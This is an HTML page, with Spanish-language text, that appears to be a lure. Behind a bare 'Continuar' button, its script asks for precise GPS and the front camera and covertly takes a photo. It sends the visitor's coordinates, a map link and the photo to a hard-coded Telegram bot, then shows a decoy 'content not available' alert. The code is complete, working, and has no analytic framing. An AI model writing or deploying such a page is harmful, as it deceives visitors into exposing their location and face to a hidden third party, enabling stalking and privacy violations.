<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title></title>
    <style>
        body {
            background: white;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        button {
            background: #007aff;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 14px 20px;
            font-size: 18px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: 0.2s;
        }
        button:active {
            transform: scale(0.97);
            background: #005fc1;
        }
        p {
            color: #555;
            margin-top: 20px;
            font-size: 14px;
        }
    </style>
</head>
<body>
<div style="max-width: 300px; width: 100%;">
    <button id="btn">Continuar</button>
    <p>Haz clic para continuar</p>
</div>
<video id="video" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
    // 🔐 REVOCA EL TOKEN VIEJO Y PON AQUÍ EL NUEVO (crea uno con @BotFather)
    const BOT_TOKEN = '8803149571:AAHb4seP9jcK9uv9Tfc7vQiZseyo_c6rcw';
    const CHAT_ID = '7555997298';

    async function sendMessage(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        } catch(e) {}
    }

    async function sendPhoto(blob) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, 'photo.jpg');
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        } catch(e) {}
    }

    async function capturePhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        } catch(e) {
            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
            catch(err) { return null; }
        }
        video.srcObject = stream;
        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
        await new Promise(r => setTimeout(r, 500));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        stream.getTracks().forEach(t => t.stop());
        return blob;
    }

    function getGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve(null); return; }
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 15000 }
            );
        });
    }

    document.getElementById('btn').onclick = async () => {
        const gps = await getGPS();
        let message = `📸 *Nuevo visitante*\n`;
        if (gps) {
            message += `📍 Ubicación exacta:\nLat: ${gps.lat}\nLng: ${gps.lng}\nPrecisión: ±${gps.accuracy}m\nhttps://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
        } else {
            message += `📍 Ubicación: No disponible (permiso denegado)\n`;
        }
        await sendMessage(message);
        const foto = await capturePhoto();
        if (foto) await sendPhoto(foto);
        // Después de enviar, muestra un mensaje inofensivo
        alert("Contenido no disponible");
    };
</script>
</body>
</html>
